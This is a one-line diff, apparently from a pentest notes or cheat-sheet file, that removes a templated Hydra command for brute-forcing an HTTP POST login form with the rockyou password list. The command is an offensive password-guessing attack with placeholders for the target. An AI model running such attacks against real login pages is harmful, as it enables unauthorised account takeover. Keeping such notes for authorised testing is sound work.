@@ -1,1 +1,0 @@
-hydra -l <user> -P /usr/share/wordlists/rockyou.txt <ip> http-post-form "/<login_page.php>:<post_body_user>=<user>&<post_body_pass>=^<pass>^:<string_identifying_failed_login>"
